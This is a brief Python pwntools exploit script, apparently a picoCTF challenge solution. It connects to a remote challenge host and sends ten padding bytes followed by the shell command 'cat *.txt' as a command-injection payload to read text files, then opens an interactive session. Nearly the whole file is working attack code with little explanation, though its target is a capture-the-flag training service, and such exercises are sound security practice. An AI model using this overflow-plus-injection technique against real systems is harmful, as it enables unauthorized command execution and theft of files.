from pwn import *

elf = context.binary = ELF('./vuln')
#ly = process()
ly = remote('amiable-citadel.picoctf.net', 60911)

payload = flat(
    'A'*10,
    'cat *.txt' #command shell injection or we can call it os injection
)

ly.sendlineafter('What is your name?\n', payload)
ly.interactive()